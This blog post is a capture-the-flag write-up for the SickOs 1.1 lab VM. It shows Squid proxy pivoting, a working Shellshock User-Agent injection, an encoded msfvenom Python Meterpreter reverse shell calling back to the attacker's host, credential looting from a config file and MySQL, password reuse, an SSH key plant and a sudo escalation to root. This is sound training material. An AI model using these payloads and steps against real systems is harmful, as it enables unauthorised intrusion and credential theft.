<!DOCTYPE html>
<html lang="en-us">
<head>
<meta charset="utf-8">
<meta name="description" content="">
<meta name="keywords" content="">
<meta name="author" content="">
<meta name="generator" content="Hugo 0.15" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
<title>SickOs 1.1 - rastamouse.me</title>
</head>
<body>

<header>
  <div class="container">
    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
    <span class="caret"># _</span>
  </div>
</header>

<div class="container">


<main role="main" class="article">
  
<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
  <div class="meta">

    <span class="key">published on</span>
    <span class="val"><time itemprop="datePublished" datetime="2015-12-12">December 12, 2015</time></span>


    <span class="key">in</span>
    <span class="val">

        <a href="http://rastamouse.me/categories/writeup">writeup</a>

    </span>


    <br>
    <span class="key">tags:</span>
    <span class="val">

        <a href="http://rastamouse.me/tags/sickos">sickos</a>

    </span>

  </div>
  <h1 class="headline" itemprop="headline">SickOs 1.1</h1>
  <section class="body" itemprop="articleBody">
    

<p>This VM was made by some chap called <a href="https://twitter.com/D4rk36">D4rk</a>. His description:  This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them.</p>

<p>So without further ado&hellip;</p>

<h2 id="port-scan:99a1d37ca1e2b0e17a0eda41f22eb05a">Port Scan</h2>

<p>As always, smash it with <code>nmap</code> :)</p>

<pre><code class="language-text">root@kali:~# nmap -n -p- -A 192.168.50.105

PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
|_  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
3128/tcp open   http-proxy Squid http proxy 3.1.19
|_http-server-header: squid/3.1.19
|_http-title: ERROR: The requested URL could not be retrieved
8080/tcp closed http-proxy

MAC Address: 08:00:27:17:00:0D (Oracle VirtualBox virtual NIC)
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.0
</code></pre>

<p>My first assumption was that I should attempt to connect to port <code>8080</code>, via the Squid Proxy on <code>3128</code>.  So I tried to manually connect using the HTTP CONNECT method.</p>

<pre><code class="language-text">root@kali:~# nc 192.168.50.105 3128
CONNECT 127.0.0.1:8080 HTTP/1.0

HTTP/1.0 403 Forbidden
Server: squid/3.1.19
Mime-Version: 1.0
Date: Sat, 12 Dec 2015 13:49:09 GMT
Content-Type: text/html
Content-Length: 3020
X-Squid-Error: ERR_ACCESS_DENIED 0
Vary: Accept-Language
Content-Language: en
X-Cache: MISS from localhost
X-Cache-Lookup: NONE from localhost:3128
Via: 1.0 localhost (squid/3.1.19)
Connection: close
</code></pre>

<p>It seems that maybe there is an ACL in place, which stops us from accessing some ports.  We can connect port 22 via the proxy just fine, but not others.</p>

<pre><code class="language-text">root@kali:~# nc 192.168.50.105 3128
CONNECT 127.0.0.1:22 HTTP/1.0

HTTP/1.0 200 Connection established

SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.1

Protocol mismatch.
</code></pre>

<p>I tried using the <code>nmap --proxy</code> option, but it didn&rsquo;t return any open or closed ports for me.  Whilst I was moaning, <a href="https://twitter.com/Arr0way">Arr0way</a> pointed out that there was an MSF module that I could try instead.</p>

<pre><code class="language-text">msf &gt; use auxiliary/scanner/http/squid_pivot_scanning

Module options (auxiliary/scanner/http/squid_pivot_scanning):

   Name          Current Setting                                  Required  Description
   ----          ---------------                                  --------  -----------
   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RANGE         127.0.0.1                                        yes       IPs to scan through Squid proxy
   RHOSTS        192.168.50.105                                   yes       The target address range or CIDR identifier
   RPORT         3128                                             yes       The target port
   THREADS       1000                                             yes       The number of concurrent threads
   VHOST                                                          no        HTTP server virtual host

msf auxiliary(squid_pivot_scanning) &gt; run 

[+] [192.168.50.105] 127.0.0.1 is alive but 21 is CLOSED
[+] [192.168.50.105] 127.0.0.1:80 seems OPEN
[+] [192.168.50.105] 127.0.0.1 is alive but 139 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 445 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 1433 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 1521 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 1723 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 3389 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 8080 is CLOSED
[+] [192.168.50.105] 127.0.0.1 is alive but 9100 is CLOSED
</code></pre>

<p>This worked a lot better as port 80 looked open.  I used <code>cURL</code>, along with its proxy option to try and talk to the web service.</p>

<pre><code class="language-text">root@kali:~# curl -v http://127.0.0.1 -x http://192.168.50.105:3128
* Rebuilt URL to: http://127.0.0.1/
* Hostname was NOT found in DNS cache
*   Trying 192.168.50.105...
* Connected to 192.168.50.105 (192.168.50.105) port 3128 (#0)
&gt; GET http://127.0.0.1/ HTTP/1.1
&gt; User-Agent: curl/7.38.0
&gt; Host: 127.0.0.1
&gt; Accept: */*
&gt; Proxy-Connection: Keep-Alive
&gt; 
* HTTP 1.0, assume close after body
&lt; HTTP/1.0 200 OK
&lt; Date: Sat, 12 Dec 2015 14:04:49 GMT
&lt; Server: Apache/2.2.22 (Ubuntu)
&lt; X-Powered-By: PHP/5.3.10-1ubuntu3.21
&lt; Vary: Accept-Encoding
&lt; Content-Length: 21
&lt; Content-Type: text/html
&lt; X-Cache: MISS from localhost
&lt; X-Cache-Lookup: MISS from localhost:3128
&lt; Via: 1.0 localhost (squid/3.1.19)
* HTTP/1.0 connection set to keep alive!
&lt; Connection: keep-alive
&lt; 
&lt;h1&gt;
BLEHHH!!!
&lt;/h1&gt;
</code></pre>

<p>Next I decided to try and find any other pages/directories that might reveal a webapp of some sort.  For this I used <code>dirbuster</code>.  After a few seconds, it spat out an error concerning responses from pages that don&rsquo;t exist.</p>

<div align="center">
	<figure style="background-color: #f2f0ec;" >
    
        <img src="/img/writeups/sickos-1/dirbuster.jpg"  />
    
    
</figure>
</div>

<p>It&rsquo;s accessing <code>/cgi-bin/status</code> and no matter what comes after (i.e. <code>/cgi-bin/status/junk</code>), the content of the script gets returned.  Dirbuster was getting confused because the uptime was obviously changing between requests.</p>

<p>Regardless, we have a cgi script that&rsquo;s just screaming shellshock.</p>

<h2 id="shellshock:99a1d37ca1e2b0e17a0eda41f22eb05a">Shellshock</h2>

<pre><code class="language-text">root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128
{ &quot;uptime&quot;: &quot; 19:49:53 up 2:41, 1 user, load average: 0.00, 0.01, 0.01&quot;, &quot;kernel&quot;: &quot;Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux&quot;}

root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &quot;() { :; }; echo; /usr/bin/id&quot;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>

<p>Let&rsquo;s try and get a reverse shell going - you could use something simple like a <code>nc -e /bin/sh</code> or TCP reverse shell, but I thought I would spice things up with a bit of Meterpreter.  Confirm there is Python installed&hellip;</p>

<pre><code class="language-text">root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &quot;() { :; }; echo; /usr/bin/which python&quot;
/usr/bin/python
</code></pre>

<p>Then generate a payload.</p>

<pre><code class="language-text">root@kali:~# msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.50.101 LPORT=4444
import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjUwLjEwMScsNDQ0NCkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))
</code></pre>

<h2 id="shell:99a1d37ca1e2b0e17a0eda41f22eb05a">Shell</h2>

<p>All you have to do to get this working is <code>/usr/bin/python -c</code> and copy/paste the <code>msfvenom</code> output, but make sure you escape the double-quote characters.</p>

<pre><code class="language-text">root@kali:~# curl http://127.0.0.1/cgi-bin/status -x http://192.168.50.105:3128 -A &quot;() { :; }; echo; /usr/bin/python -c \&quot;import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxOTIuMTY4LjUwLjEwMScsNDQ0NCkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))&quot;\&quot;

msf exploit(handler) &gt; exploit 

[*] Started reverse handler on 192.168.50.101:4444 
[*] Starting the payload handler...
[*] Sending stage (36849 bytes) to 192.168.50.105
[*] Meterpreter session 1 opened (192.168.50.101:4444 -&gt; 192.168.50.105:40247) at 2015-12-12 14:24:19 +0000

meterpreter &gt; sysinfo 
Computer     : SickOs
OS           : Linux 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014
Architecture : i686
Meterpreter  : python/python
</code></pre>

<p>After browsing the filesystem, we find some more things in <code>/var/www/</code>, including the following file:</p>

<pre><code class="language-text">-rwxrwxrwx 1 root root  109 Dec  5 07:57 connect.py
</code></pre>

<p>This set some alarm bells ringing, but I couldn&rsquo;t find anywhere where this was getting executed as root (e.g a cron).  There is also a directory for <code>wolfcms</code>, so we check that out.</p>

<pre><code class="language-text">meterpreter &gt; ls
Listing: /var/www/wolfcms
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100755/rwxr-xr-x  950   fil   2015-12-05 02:13:03 +0000  .htaccess
100777/rwxrwxrwx  4084  fil   2015-12-06 15:47:22 +0000  CONTRIBUTING.md
100777/rwxrwxrwx  2405  fil   2015-12-06 15:47:22 +0000  README.md
100777/rwxrwxrwx  403   fil   2015-12-06 15:47:22 +0000  composer.json
100777/rwxrwxrwx  3058  fil   2015-12-06 15:47:22 +0000  config.php
40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  docs
100777/rwxrwxrwx  894   fil   2015-12-06 15:47:22 +0000  favicon.ico
100777/rwxrwxrwx  6815  fil   2015-12-06 15:47:22 +0000  index.php
40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  public
100777/rwxrwxrwx  0     fil   2015-12-06 15:47:22 +0000  robots.txt
40777/rwxrwxrwx   4096  dir   2015-12-06 15:47:22 +0000  wolf


meterpreter &gt; cat config.php
&lt;?php 

// Database information:
// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
// The path can only be absolute path or :memory:
// For more info look at: www.php.net/pdo

// Database settings:
define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
define('DB_USER', 'root');
define('DB_PASS', 'john@123');
define('TABLE_PREFIX', '');
</code></pre>

<p>We can drop into a shell, connect to <code>mysql</code> and see if we can find anything interesting.</p>

<pre><code class="language-text">$ mysql -uroot -p
Enter password: john@123

mysql&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wolf               |
+--------------------+

mysql&gt; use wolf;

mysql&gt; show tables;
+-----------------+
| Tables_in_wolf  |
+-----------------+
| cron            |
| layout          |
| page            |
| page_part       |
| page_tag        |
| permission      |
| plugin_settings |
| role            |
| role_permission |
| secure_token    |
| setting         |
| snippet         |
| tag             |
| user            |
| user_role       |
+-----------------+

mysql&gt; select * from user;
+----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
| id | name          | email              | username | password                                                                                                                         | salt                                                             | language | last_login          | last_failure | failure_count | created_on          | updated_on          | created_by_id | updated_by_id |
+----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
|  1 | Administrator | admin@yoursite.com | admin    | 3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f | 6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167 | en       | 2015-12-05 07:47:16 | NULL         |             0 | 2015-12-05 06:25:06 | 2015-12-05 07:47:16 |             1 |          NULL |
+----+---------------+--------------------+----------+----------------------------------------------------------------------------------------------------------------------------------+------------------------------------------------------------------+----------+---------------------+--------------+---------------+---------------------+---------------------+---------------+---------------+
</code></pre>

<p>And we can quickly grab the mysql users.</p>

<pre><code class="language-text">mysql&gt; select * from mysql.user;
+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
| Host      | User             | Password                                  | Select_priv | Insert_priv | Update_priv | Delete_priv | Create_priv | Drop_priv | Reload_priv | Shutdown_priv | Process_priv | File_priv | Grant_priv | References_priv | Index_priv | Alter_priv | Show_db_priv | Super_priv | Create_tmp_table_priv | Lock_tables_priv | Execute_priv | Repl_slave_priv | Repl_client_priv | Create_view_priv | Show_view_priv | Create_routine_priv | Alter_routine_priv | Create_user_priv | Event_priv | Trigger_priv | Create_tablespace_priv | ssl_type | ssl_cipher | x509_issuer | x509_subject | max_questions | max_updates | max_connections | max_user_connections | plugin | authentication_string |
+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
| localhost | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| sickos    | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| 127.0.0.1 | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| ::1       | root             | *A7A20B93EC076311A63BF86B5C705B25C054DD77 | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | Y                      |          |            |             |              |             0 |           0 |               0 |                    0 |        |                       |
| localhost | debian-sys-maint | *CB98094782C386F2459D65D97B17D1DE15D1654B | Y           | Y           | Y           | Y           | Y           | Y         | Y           | Y             | Y            | Y         | Y          | Y               | Y          | Y          | Y            | Y          | Y                     | Y                | Y            | Y               | Y                | Y                | Y              | Y                   | Y                  | Y                | Y          | Y            | N                      |          |            |             |              |             0 |           0 |               0 |                    0 |        | NULL                  |
+-----------+------------------+-------------------------------------------+-------------+-------------+-------------+-------------+-------------+-----------+-------------+---------------+--------------+-----------+------------+-----------------+------------+------------+--------------+------------+-----------------------+------------------+--------------+-----------------+------------------+------------------+----------------+---------------------+--------------------+------------------+------------+--------------+------------------------+----------+------------+-------------+--------------+---------------+-------------+-----------------+----------------------+--------+-----------------------+
</code></pre>

<p>We notice that all the users are using the same hash, therefore the same password.  Sickos is also a user on the OS, so maybe they are using the same password?</p>

<pre><code class="language-text">$ su sickos
Password: john@123
bash: no job control in this shell
sickos@SickOs:~$ 
</code></pre>

<p>Awesome.  Even though SSH is running on the system, Sickos has no keys.  So I used <code>ssh-keygen</code> to create a new set of keys and the <code>.ssh</code> directory, then echo&rsquo;d my kali public key into the authorized_keys file.</p>

<pre><code class="language-text">root@kali:~# ssh sickos@192.168.50.105
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic i686)

sickos@SickOs:~$
</code></pre>

<p>We see straight away that sickos is a member of the sudo group.</p>

<pre><code class="language-text">sickos@SickOs:~$ id
uid=1000(sickos) gid=1000(sickos) groups=1000(sickos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)

sickos@SickOs:~$ sudo -l
[sudo] password for sickos: 
Matching Defaults entries for sickos on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sickos may run the following commands on this host:
    (ALL : ALL) ALL
</code></pre>

<p>Which makes elevation trivial.</p>

<pre><code class="language-text">root@SickOs:~# hostname; id
SickOs
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<h2 id="flag:99a1d37ca1e2b0e17a0eda41f22eb05a">Flag</h2>

<pre><code class="language-text">root@SickOs:~# cat /root/a0216ea4d51874464078c618298b1367.txt 
If you are viewing this!!

ROOT!

You have Succesfully completed SickOS1.1.
Thanks for Trying
</code></pre>

  </section>
</article>

</main>


</div>

<footer>
  <div class="container">
    <span class="copyright">&copy; 2015  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
  </div>
</footer>

</body>
</html>

